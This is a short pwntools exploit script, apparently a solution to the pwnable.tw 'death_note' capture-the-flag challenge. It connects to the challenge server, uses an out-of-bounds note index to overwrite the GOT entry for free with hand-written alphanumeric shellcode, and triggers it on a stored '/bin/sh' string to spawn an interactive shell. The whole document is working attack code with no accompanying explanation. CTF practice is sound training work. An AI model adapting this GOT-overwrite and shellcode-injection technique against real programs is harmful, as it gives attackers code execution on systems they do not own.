from pwn import *


context.arch = "i386"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
# context.terminal = ["tmux", "neww"]

r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)

HOST = "chall.pwnable.tw"
PORT = 10201
LOCAL = False
elf = ELF("./death_note")
libc = elf.libc

if LOCAL:
    # p = process(elf.file.name)
    # gdb.attach(p, """
    #         """)
    p = gdb.debug(elf.file.name, """
            b *0x8048873
            c
            """)
else:
    context.log_level = "info"
    p = remote(HOST, PORT)

# Exploit starts here
def add(idx, data):
    sla(b":", b"1")
    sla(b":", str(idx))
    sla(b":", data)

def free(idx):
    sla(b":", b"3")
    sla(b":", str(idx))

note = 0x804A060
idx = (elf.got["free"] - note) / 4

shellcode = """
push    eax
pop     ebx

push    edx

push    0x33
pop     edx
sub     BYTE PTR [eax + 0x28],dl
push    0x40
pop     edx
sub     BYTE PTR [eax + 0x29],dl
sub     BYTE PTR [eax + 0x29],dl

pop     edx

push    0x4b
pop     eax
sub     al,0x40
"""

add(0, b"/bin/sh")
add(idx, asm(shellcode))
free(0)

p.interactive()
